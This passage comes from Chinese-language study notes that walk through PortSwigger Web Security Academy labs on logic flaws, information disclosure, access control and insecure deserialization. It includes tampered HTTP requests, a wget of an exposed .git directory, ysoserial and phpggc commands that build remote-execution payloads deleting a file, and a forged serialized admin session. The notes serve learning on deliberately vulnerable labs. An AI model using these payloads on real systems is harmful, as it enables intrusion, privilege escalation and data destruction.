<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://0a2b00240301573a8226b6c600a20042.web-security-academy.net/register</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span>

csrf=pZRphKSTs2NSro9T0Liyh5lrW0OgB7jX&amp;username=test&amp;email=attackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattacker@exploit-0afa0022035d57868203b55501cd003f.exploit-server.net&amp;password=test</code></pre></li>
<li><p>发现邮箱被截断为255字符<img
src="https://s2.loli.net/2023/08/10/EnTObQSHhP6muzM.png"
alt="image-20230810010924104" /></p></li>
</ol></li>
<li><p>再次注册一个账号，满足如下要求：</p>
<ol type="1">
<li><p>邮箱选中部分刚好255字符<img
src="https://s2.loli.net/2023/08/10/zRoiuTYQOIw3rPF.png"
alt="image-20230810011020676" /></p></li>
<li><p>完整请求如下：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>register</span></span> <span class="token http-version property">HTTP/2</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">0a2b00240301573a8226b6c600a20042.web-security-academy.net</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=ArEtfsoGAqqc5jmG5URSVYZiCfmx90PY</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">391</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua</span><span class="token punctuation">:</span> <span class="token header-value">"Not A(Brand";v="24", "Chromium";v="110"</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Mobile</span><span class="token punctuation">:</span> <span class="token header-value">?0</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Ch-Ua-Platform</span><span class="token punctuation">:</span> <span class="token header-value">"Windows"</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">https://0a2b00240301573a8226b6c600a20042.web-security-academy.net</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://0a2b00240301573a8226b6c600a20042.web-security-academy.net/register</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span>

csrf=HuvM2eC73r5n1JJs0UnonyMNOYH5smtd&amp;username=test2&amp;email=attackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattackerattack%40dontwannacry.com.exploit-0afa0022035d57868203b55501cd003f.exploit-server.net&amp;password=test2</code></pre></li>
</ol></li>
<li><p>登录test2账号</p></li>
<li><p>删除carlos<img
src="https://s2.loli.net/2023/08/10/SdqRmDwE7ZcTHNB.png"
alt="image-20230810011136259" /></p></li>
</ol>
<h4 id="lab-inconsistent-security-controls">Lab: Inconsistent security
controls</h4>
<ol type="1">
<li>发现/admin目录，<code>dontwannacry</code><img
src="https://s2.loli.net/2023/08/10/DUs8IaoPkWFO2lz.png"
alt="image-20230810012700138" /></li>
<li>注册后，可以更改邮箱<img
src="https://s2.loli.net/2023/08/10/SwXtgNEIL4KMnDA.png"
alt="image-20230810012625538" /></li>
<li>删除carlos<img
src="https://s2.loli.net/2023/08/10/SdqRmDwE7ZcTHNB.png"
alt="image-20230810012712771" /></li>
</ol>
<h4 id="lab-2fa-simple-bypass-1">Lab: 2FA simple bypass</h4>
<ol type="1">
<li>使用wiener 双重验证后登录，观察登录后页面的url特点</li>
<li>使用carlos登录<img
src="https://s2.loli.net/2023/08/10/6cFzwXSt7UOLsDp.png"
alt="image-20230810020335622" /></li>
<li>login2换成 <img
src="https://s2.loli.net/2023/08/10/UDvRQofX819MLZt.png"
alt="image-20230810020449732" /></li>
</ol>
<h4 id="lab-insufficient-workflow-validation">Lab: Insufficient workflow
validation</h4>
<ol type="1">
<li>test
<ol type="1">
<li>将一件小额商品加入购物车，付款：注意会有一下几个页面相继出现
<ol type="1">
<li>购物车核对<img
src="https://s2.loli.net/2023/08/10/jt3WrId8AqKiYoh.png"
alt="image-20230810023022616" /></li>
<li>订单验证<img
src="https://s2.loli.net/2023/08/10/nmSxoOqAuhQvZFR.png"
alt="image-20230810023053586" /></li>
</ol></li>
</ol></li>
<li>将jacket 加入购物车，直接再次发送此请求，发现<img
src="https://s2.loli.net/2023/08/10/VsqTeC8jYFv1t3h.png"
alt="image-20230810023152101" /></li>
</ol>
<h4 id="lab-authentication-bypass-via-flawed-state-machine">Lab:
Authentication bypass via flawed state machine</h4>
<ol type="1">
<li>目录扫描出<code>/admin</code></li>
<li>test
<ol type="1">
<li>登录wiener</li>
<li>有角色选择<img
src="https://s2.loli.net/2023/08/10/Bt9OwJNZWcXYiLh.png"
alt="image-20230810024754578" /></li>
</ol></li>
<li>burp拦截，到role-selector时，丢弃该请求，并直接请求<code>/my-account</code><img
src="https://s2.loli.net/2023/08/10/3xf1eHVEPOXqgcQ.png"
alt="image-20230810024907113" /></li>
</ol>
<h4 id="lab-weak-isolation-on-dual-use-endpoint">Lab: Weak isolation on
dual-use endpoint</h4>
<ol type="1">
<li>登录账号，修改密码，删除当前密码参数，能后修改成功<img
src="https://s2.loli.net/2023/08/10/Be7rPa6yksYpbFu.png"
alt="image-20230810014757921" /></li>
<li>使用修改后的密码再次登录
<ol type="1">
<li>用户名换成：<code>administrator</code>，重复删操作</li>
</ol></li>
<li>登录administrator</li>
<li>删除carlos</li>
</ol>
<h4 id="lab-flawed-enforcement-of-business-rules">Lab: Flawed
enforcement of business rules</h4>
<ol type="1">
<li><strong>交替</strong>重复使用优惠券<img
src="https://s2.loli.net/2023/08/10/tRNT3WaqECZUp6x.png"
alt="image-20230810031446789" /></li>
</ol>
<h4 id="lab-infinite-money-logic-flaw">Lab: Infinite money logic
flaw</h4>
<ol type="1">
<li>重复购买礼品卡</li>
<li>burp自动化完成</li>
<li>Project-session<img
src="https://s2.loli.net/2023/08/10/ervQoHWZ46RkGwN.png"
alt="image-20230810074621206" /></li>
<li>scope <img src="https://s2.loli.net/2023/08/10/KcVz5tjTmdwyECB.png"
alt="image-20230810074645046" /></li>
<li>detail<img src="https://s2.loli.net/2023/08/10/Nnskcued8GhRBJl.png"
alt="image-20230810074719047" /></li>
<li>选中这5个请求<img
src="https://s2.loli.net/2023/08/10/gBkW6ESepChGL2R.png"
alt="image-20230810074806757" /></li>
<li>处理请求4：config item<img
src="https://s2.loli.net/2023/08/10/ItTObzRsH5GNfyD.png"
alt="image-20230810074838963" /></li>
<li>处理请求5<img
src="https://s2.loli.net/2023/08/10/WUEYzQAPv6bDrfN.png"
alt="image-20230810074910969" /></li>
<li>test macro:对比请求4和5的兑换码是否一致<img
src="https://s2.loli.net/2023/08/10/MuUXlGK7H4SzOmn.png"
alt="image-20230810074958224" /></li>
<li>一致则，持续点击ok到burp主页面，
<ol type="1">
<li>在intruder处理该请求<img
src="https://s2.loli.net/2023/08/10/Y2XtyF6MZHGbJiv.png"
alt="image-20230810075107459" /></li>
<li>请求数<img src="https://s2.loli.net/2023/08/10/XHYVLZvkWlac3ox.png"
alt="image-20230810075136854" /></li>
<li>单线程<img src="https://s2.loli.net/2023/08/10/9SRXW47pNLZ5Yvj.png"
alt="image-20230810075153164" /></li>
</ol></li>
<li>刷新页面，查看余额，完成intruder,购买jac</li>
</ol>
<h4 id="lab-authentication-bypass-via-encryption-oracle">Lab:
Authentication bypass via encryption oracle</h4>
<ol type="1">
<li><p>注意到email值引起的变化，注意<strong>不同</strong>的请求地址</p>
<ol type="1">
<li><p><strong>评论</strong>请求：加密请求<img
src="https://s2.loli.net/2023/08/10/ymzEaZKFOtIN6d4.png"
alt="image-20230810064353321" /></p></li>
<li><p>作为响应：解密请求<img
src="https://s2.loli.net/2023/08/10/zoMpRV75qTOexPm.png"
alt="image-20230810064439779" /></p></li>
<li><p>对<code>stay-login-in</code> cookie解码<img
src="https://s2.loli.net/2023/08/10/HLGbBJ8tn3Csydp.png"
alt="image-20230810064536378" /></p></li>
<li><p>发现了其中stay-login-in构成，</p></li>
<li><p>且能够发现email值加密后都会显示共同前缀：<code>Invalid email address:</code></p></li>
</ol></li>
<li><p>如果使用<code>administrator:your-timestamp</code>作为email值,加密后的数据一定是16的倍数，而Invalid
email
address:一共23字节（后面有<strong>空格</strong>），（总字节数是16的倍数）-（不是16倍数的前缀）=
非16的倍数，如果就这样传进去会报错：非16倍数类似错误</p></li>
<li><p>因此再加<strong>9字节</strong>+<strong>23字节前缀</strong>=16的倍数，因此<code>email</code>=xxxxxxxxxadministrator:your-timestamp</p>
<ol type="1">
<li>将此加密后的数据发送到decoder,url解码，base64解码，并删除前32字节<img
src="https://s2.loli.net/2023/08/10/sBPZduDHnOYvSzT.png"
alt="image-20230810065614096" /></li>
</ol></li>
<li><p>删除后，再base64加密，url加密，复制结果到<code>GET /</code>中的stay-login-in值中，删除session，发送请求，登录了administrator</p></li>
</ol>
<h3 id="information-disclosure-vulnerabilities">Information disclosure
vulnerabilities</h3>
<h4 id="lab-information-disclosure-on-debug-page">Lab: Information
disclosure on debug page</h4>
<ol type="1">
<li><p>engagement tools<img
src="https://s2.loli.net/2023/08/11/UPEVw13JYRkZnhz.png"
alt="image-20230811204951886" /></p></li>
<li><p>result<img
src="https://s2.loli.net/2023/08/11/NhiBq4fDtEUInZM.png"
alt="image-20230811205023609" /></p></li>
<li><p>find<img src="https://s2.loli.net/2023/08/11/3NkoGLtSYU2BJfV.png"
alt="image-20230811205049997" /></p></li>
</ol>
<h3 id="lab-source-code-disclosure-via-backup-files">Lab: Source code
disclosure via backup files</h3>
<ol type="1">
<li>request <code>/robots.txt</code><img
src="https://s2.loli.net/2023/08/11/1n52KlditehMWb4.png"
alt="image-20230811215236432" /></li>
<li>request <code>/backup</code><img
src="https://s2.loli.net/2023/08/11/1nxeX2Zvd8qtKJp.png"
alt="image-20230811215314870" /></li>
<li>查看源码<img
src="https://s2.loli.net/2023/08/11/3BPcsuU8tmkVixJ.png"
alt="image-20230811215330523" /></li>
</ol>
<h4 id="lab-authentication-bypass-via-information-disclosure">Lab:
Authentication bypass via information disclosure</h4>
<ol type="1">
<li><p>请求 <code>/admin</code> 要求本地用户/ip</p></li>
<li><p>TRACE /admin<img
src="https://s2.loli.net/2023/08/11/KDrOqib42GBVnWt.png"
alt="image-20230811222201916" /></p></li>
<li><p>burp使用代理<img
src="https://s2.loli.net/2023/08/11/4r8YvXhgVdEjiPo.png"
alt="image-20230811222310442" /></p></li>
</ol>
<h4 id="lab-information-disclosure-in-version-control-history">Lab:
Information disclosure in version control history</h4>
<ol type="1">
<li><p>request <code>/.git</code></p></li>
<li><p>下载 <code>/.git/</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-r</span> https://0aa50088038b7be685d71473008f00a7.web-security-academy.net/.git/</code></pre></li>
<li><p><code>gitub desktop</code>打开文件夹<img
src="https://s2.loli.net/2023/08/11/6hs3a5kdqXfURx7.png"
alt="image-20230811231336180" /></p></li>
</ol>
<h3 id="access-control-vulnerabilities-and-privilege-escalation">Access
control vulnerabilities and privilege escalation</h3>
<h4 id="what-is-access-control">What is access control?</h4>
<ol type="1">
<li><p><strong>身份验证</strong>：可识别用户并确认他们的身份。
<strong>会话管理</strong>：可识别同一用户正在发出哪些后续 HTTP 请求。
<strong>访问控制</strong>：确定是否允许用户执行他们尝试执行的操作。</p></li>
<li><p><strong>Vertical access controls</strong></p>
<p><strong>Horizontal access controls</strong></p>
<p><strong>Context-dependent access controls</strong></p></li>
</ol>
<h4 id="lab-unprotected-admin-functionality">Lab: Unprotected admin
functionality</h4>
<ol type="1">
<li><code>GET /administrator-panel/</code> <img
src="https://s2.loli.net/2023/08/12/uePw2okjnLf7xQE.png"
alt="image-20230812101540559" /></li>
</ol>
<h4 id="lab-unprotected-admin-functionality-with-unpredictable-url">Lab:
Unprotected admin functionality with unpredictable URL</h4>
<ol type="1">
<li>查看js源码<img
src="https://s2.loli.net/2023/08/12/mMVHdvB3gY7GsAJ.png" /></li>
</ol>
<h4 id="lab-user-role-controlled-by-request-parameter">Lab: User role
controlled by request parameter</h4>
<ol type="1">
<li>全程使用burp拦截请求，修改每一个请求的：<strong>admin=false</strong><img
src="https://s2.loli.net/2023/08/12/QkyBDqg8nGIiz16.png"
alt="image-20230812103950179" /></li>
</ol>
<h4 id="lab-user-role-can-be-modified-in-user-profile">Lab: User role
can be modified in user profile</h4>
<ol type="1">
<li>拦截请求，登录账号，修改邮箱<img
src="https://s2.loli.net/2023/08/12/PkVdugI672KQBDU.png"
alt="image-20230812104604617" /></li>
<li>修改提交的json<img
src="https://s2.loli.net/2023/08/12/mVYLUvqgdTsJo6b.png"
alt="image-20230812104637804" /></li>
</ol>
<h4 id="lab-url-based-access-control-can-be-circumvented">Lab: URL-based
access control can be circumvented</h4>
<ol type="1">
<li>test<img src="https://s2.loli.net/2023/08/12/6z1cwgJlvroN7pQ.png"
alt="image-20230812111359339" /></li>
<li>result<img src="https://s2.loli.net/2023/08/12/MuKokOlEqgH4fcI.png"
alt="image-20230812111422257" /></li>
</ol>
<h4 id="lab-method-based-access-control-can-be-circumvented">Lab:
Method-based access control can be circumvented'</h4>
<ol type="1">
<li>登录管理员账户，可以更改用户权限<img
src="https://s2.loli.net/2023/08/13/43o6JDsKBpPdGEa.png"
alt="image-20230813010023803" /></li>
<li>无痕模式窗口，普通用户登录<img
src="https://s2.loli.net/2023/08/13/yWsRNbUxK9cCHEL.png"
alt="image-20230813010434092" />
<ol type="1">
<li>获取<strong>登录后</strong>的cookie<img
src="https://s2.loli.net/2023/08/13/mWl8H53aTjeZXy9.png"
alt="image-20230813010213791" /></li>
<li>将该cookie粘贴到<strong>管理员用户</strong>的更改角色请求中的cookie,显示未授权<img
src="https://s2.loli.net/2023/08/13/zKNhvnIw5L8dEA3.png"
alt="image-20230813010353765" /></li>
</ol></li>
<li>继续此页面，但更改请求方法<img
src="https://s2.loli.net/2023/08/13/VhweOB7YzM16gQT.png"
alt="image-20230813010514760" />
<ol type="1">
<li>但此次是将我们拥有的<strong>wiener</strong>账户升级为管理员，显示重定向<img
src="https://s2.loli.net/2023/08/13/HBMycuq9vaN1CG5.png"
alt="image-20230813010632204" /></li>
</ol></li>
</ol>
<h4 id="lab-user-id-controlled-by-request-parameter">Lab: User ID
controlled by request parameter</h4>
<ol type="1">
<li>wiener登录</li>
<li>更改id=carlos,获得其api<img
src="https://s2.loli.net/2023/08/13/Tuay2xhQ8wO1Ldk.png"
alt="image-20230813012110373" /></li>
</ol>
<h4
id="lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids">Lab:
User ID controlled by request parameter, with unpredictable user
IDs</h4>
<ol type="1">
<li>wiener登录,api页面有个id参数</li>
<li>找到carlos发表的文章，有它id<img
src="https://s2.loli.net/2023/08/13/yM92eCIWchHxotU.png"
alt="image-20230813013052417" /></li>
<li>替换为carlos id<img
src="https://s2.loli.net/2023/08/13/mj3MJ4gcvk8zoPI.png"
alt="image-20230813013156095" /></li>
</ol>
<h4
id="lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect">Lab:
User ID controlled by request parameter with data leakage in
redirect</h4>
<ol type="1">
<li>id换成carlos,重定向<img
src="https://s2.loli.net/2023/08/13/E57vDzJRX6TZoOx.png"
alt="image-20230813013735736" /></li>
</ol>
<h4
id="lab-user-id-controlled-by-request-parameter-with-password-disclosure">Lab:
User ID controlled by request parameter with password disclosure</h4>
<ol type="1">
<li>id换成administrator<img
src="https://s2.loli.net/2023/08/13/9APJ53iKOHBwMjF.png"
alt="image-20230813014648264" /></li>
</ol>
<h4 id="lab-insecure-direct-object-references">Lab: Insecure direct
object references</h4>
<ol type="1">
<li>live chat 对话</li>
<li>点击 <strong>vie
transcript</strong>,发现生成的文件的filename是递增的<img
src="https://s2.loli.net/2023/08/13/7cXYSypfxgtRT9V.png"
alt="xxx" /></li>
<li>换成1.txt<img
src="https://s2.loli.net/2023/08/13/lgWwpFMfsCUOVn5.png"
alt="image-20230813015622817" /></li>
</ol>
<h4 id="lab-multi-step-process-with-no-access-control-on-one-step">Lab:
Multi-step process with no access control on one step</h4>
<ol type="1">
<li>使用wiener的cookie,在admin的请求中，将自己升级为管理员<img
src="https://s2.loli.net/2023/08/13/SQUexKHNiL9zWwX.png"
alt="image-20230813021954094" /></li>
</ol>
<h4 id="referer-based-access-control">Referer-based access control</h4>
<ol type="1">
<li>Referer头一般会被浏览器添加到请求中，以指示<strong>发起请求</strong>的页面。</li>
</ol>
<h4 id="lab-referer-based-access-control">Lab: Referer-based access
control</h4>
<ol type="1">
<li>在wiener账户下，更改权限，响应未授权<img
src="https://s2.loli.net/2023/08/13/8EvcZSDxq4jIOBl.png"
alt="image-20230813024952840" /></li>
<li>将Referer头部换成:
https://0a2c005b03b8510d8321424b00ec0080.web-security-academy.net/admin，再次请求，成功<img
src="https://s2.loli.net/2023/08/13/Y2G8q5sdvrfiMKl.png"
alt="image-20230813025007536" /></li>
</ol>
<h3 id="insecure-deserializationreset">Insecure
deserialization（reset）</h3>
<h4 id="how-to-identify-insecure-deserialization">How to identify
insecure deserialization</h4>
<ol type="1">
<li><p>php example</p>
<pre class="language-none"><code class="language-none">$user-&gt;name &#x3D; &quot;carlos&quot;; $user-&gt;isLoggedIn &#x3D; true;</code></pre>
<p>When serialized, this object may look something like this:</p>
<pre class="language-none"><code class="language-none">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;:s:6:&quot;carlos&quot;; s:10:&quot;isLoggedIn&quot;:b:1;&#125;</code></pre>
<p>This can be interpreted as follows:</p>
<ul>
<li><code>O:4:"User"</code> - An object with the 4-character class name
<code>"User"</code></li>
<li><code>2</code> - the object has 2 attributes</li>
<li><code>s:4:"name"</code> - The key of the first attribute is the
4-character string <code>"name"</code></li>
<li><code>s:6:"carlos"</code> - The value of the first attribute is the
6-character string <code>"carlos"</code></li>
<li><code>s:10:"isLoggedIn"</code> - The key of the second attribute is
the 10-character string <code>"isLoggedIn"</code></li>
<li><code>b:1</code> - The value of the second attribute is the boolean
value <code>true</code></li>
</ul></li>
<li><p>Some languages, such as Java, use <code>binary</code>
serialization formats</p></li>
<li><p>Any class that implements the interface
<code>java.io.Serializable</code> can be serialized and deserialized. If
you have source code access, take note of any code that uses the
<code>readObject()</code> method, which is used to read and deserialize
data from an <code>InputStream</code></p></li>
</ol>
<h4 id="lab-modifying-serialized-objects">Lab: Modifying serialized
objects</h4>
<ol type="1">
<li>modify value<img
src="https://s2.loli.net/2023/08/17/WwHOmLqf89ZduRC.png"
alt="image-20230817115816318" /></li>
</ol>
<h4 id="lab-modifying-serialized-data-types">Lab: Modifying serialized
data types</h4>
<ol type="1">
<li><p>In Burp Repeater, use the Inspector panel to modify the session
cookie as follows:<img
src="https://s2.loli.net/2023/08/17/4Z6QIjFu3fPqX8h.png"
alt="image-20230817122214040" /></p>
<ul>
<li>Update the length of the <code>username</code> attribute to
<code>13</code>.</li>
<li>Change the username to <code>administrator</code>.</li>
<li>Change the access token to the integer <code>0</code>. As this is no
longer a string, you also need to remove the double-quotes surrounding
the value.</li>
<li>Update the data type label for the access token by replacing
<code>s</code> with <code>i</code>.</li>
</ul>
<p>The result should look like this:</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">O</span><span class="token punctuation">:</span><span class="token header-value">4:"User":2:&#123;s:8:"username";s:13:"administrator";s:12:"access_token";i:0;&#125;	</span></span></code></pre></li>
</ol>
<h4
id="lab-using-application-functionality-to-exploit-insecure-deserialization">Lab:
Using application functionality to exploit insecure deserialization</h4>
<ol type="1">
<li><p>modify a string to delete arbitrary file</p>
<figure>
<img src="https://s2.loli.net/2023/08/17/9fVscu2htTAGbji.png"
alt="image-20230817152933156" />
<figcaption aria-hidden="true">image-20230817152933156</figcaption>
</figure></li>
</ol>
<h4 id="magic-methods">Magic methods</h4>
<h4 id="lab-arbitrary-object-injection-in-php">Lab: Arbitrary object
injection in PHP</h4>
<ol type="1">
<li>get source code<img
src="https://s2.loli.net/2023/08/17/GqSzWuVCUwoOYe6.png"
alt="image-20230817161341659" /></li>
<li>analysis<img
src="https://s2.loli.net/2023/08/17/wKnyecLbsNVCr7O.png"
alt="image-20230817161400241" /></li>
<li>construct a CustomTemplate object:
<ol type="1">
<li>base64 encode</li>
<li>url encode<img
src="https://s2.loli.net/2023/08/17/iaHdPZCj7MxAqUg.png"
alt="image-20230817161605675" /></li>
</ol></li>
</ol>
<h4 id="lab-exploiting-java-deserialization-with-apache-commons">Lab:
Exploiting Java deserialization with Apache Commons</h4>
<ol type="1">
<li><p>This lab uses a serialization-based session mechanism and loads
the <code>Apache Commons Collections library</code>.</p></li>
<li><p>In Java versions 15 and below:</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-all.jar CommonsCollections4 <span class="token string">'rm /home/carlos/morale.txt'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span> cookieToUse.txt </code></pre>
<ol type="1">
<li><code>java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 &gt; cookieToUse.txt</code>
- <code>java -jar ysoserial-all.jar</code>：这部分运行了
<code>ysoserial</code> 工具，该工具用于生成针对各种 Java
库的序列化负载。</li>
<li><code>CommonsCollections4</code>：这指定了从 ysoserial 中使用的针对
Commons Collections 版本 4 的 gadget chain。</li>
<li><code>'rm /home/carlos/morale.txt'</code>：这是您想要在目标系统上远程执行的命令。在这种情况下，它试图从目录
"/home/carlos" 中删除文件 "morale.txt"。</li>
<li><code>| base64 -w 0</code>：这将生成的负载输出传递给
<code>base64</code> 命令，并使用 <code>-w 0</code>
选项确保输出没有换行。</li>
<li><code>&gt; cookieToUse.txt</code>：这将经过 base64
编码的负载重定向到名为 "cookieToUse.txt" 的文件。
在这种情况下，意图似乎是生成一个恶意负载，当执行时，将会在远程系统上删除名为
"morale.txt" 的文件。然后，将 base64 编码的负载保存到名为
"cookieToUse.txt" 的文件中，这可能暗示攻击者可能打算将此负载注入到
cookie 或其他数据字段中，以利用目标系统。</li>
</ol></li>
<li><p>url encode</p></li>
</ol>
<hr />
<ol type="1">
<li>The <code>URLDNS</code> chain ,it does not rely on the target
application using a specific vulnerable library and works in any known
Java version.</li>
</ol>
<h4
id="lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain">Lab:
Exploiting PHP deserialization with a pre-built gadget chain</h4>
<ol type="1">
<li><p>analyze cookie：url decode &amp; base64 decode <img
src="https://s2.loli.net/2023/08/18/2HayQb6Wn1rmlPS.png"
alt="image-20230818103807507" /><img
src="https://s2.loli.net/2023/08/18/vHUXipOem1Cdu97.png"
alt="image-20230818103700023" /></p>
<ol type="1">
<li><p>token is aobject</p></li>
<li><p><code>sig_hmac_sha1</code>
是一个可能用于签名和验证数据完整性的标识。在计算机科学中，HMAC-SHA1（Hash-based
Message Authentication Code - Secure Hash Algorithm
1）是一种常用的消息认证码算法。 HMAC-SHA1 通常用于以下目的：</p>
<ol type="1">
<li><p><strong>消息认证码（MAC）：</strong> HMAC-SHA1
用于验证数据的完整性和真实性。通过使用密钥对数据进行散列，可以生成一个与数据相关的固定长度的哈希值，这个哈希值被称为消息认证码。接收方可以使用相同的密钥和算法来验证发送方提供的消息认证码是否与接收到的数据匹配，从而判断数据是否遭到篡改。</p></li>
<li><p><strong>数字签名：</strong> HMAC-SHA1
也可以用于生成数字签名。发送方可以使用私钥对数据的哈希值进行签名，接收方可以使用公钥来验证签名的真实性。数字签名用于验证消息的来源和完整性。
在你提供的上下文中，<code>sig_hmac_sha1</code>
可能是一个指示数据签名的标识，而你提供的哈希值和其他信息可能是用于验证数据完整性和真实性的组成部分。然而，为了更准确地理解和解释这些信息，我需要更多的背景和上下文。如果有更多细节，我将非常乐意提供进一步的帮助。</p></li>
</ol></li>
</ol></li>
<li><p>request:<code>/cgi-bin/phpinfo.php</code>.<img
src="https://s2.loli.net/2023/08/18/Oe4fRuwZM9r7Wx8.png"
alt="image-20230818110440255" /></p></li>
<li><p>use phpggc<img
src="https://s2.loli.net/2023/08/18/ZvLCF2HMNSW3U1t.png"
alt="image-20230818110636285" /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">./phpggc Symfony/RCE4 <span class="token builtin class-name">exec</span> <span class="token string">'rm /home/carlos/morale.txt'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span> xx.txt</code></pre></li>
<li><p>run script</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"OBJECT-GENERATED-BY-PHPGGC"</span><span class="token punctuation">;</span>
<span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"</span><span class="token punctuation">;</span>
